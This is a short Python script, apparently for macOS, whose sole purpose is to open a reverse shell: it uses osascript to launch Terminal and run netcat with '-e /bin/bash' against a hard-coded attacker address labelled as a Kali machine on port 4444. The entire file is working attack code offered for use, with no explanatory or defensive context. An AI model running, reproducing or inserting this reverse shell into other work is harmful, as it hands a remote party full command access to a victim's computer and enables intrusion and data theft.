import os
import subprocess

KALI_IP = "192.168.1.66"  # Replace with your Kali Linux IP
PORT = "4444"              # Reverse shell port

def open_reverse_shell():
    """Open a reverse shell to the Kali machine."""
    command = f"osascript -e 'tell application \"Terminal\" to do script \"nc {KALI_IP} {PORT} -e /bin/bash\"'"
    subprocess.run(command, shell=True)

if __name__ == "__main__":
    open_reverse_shell()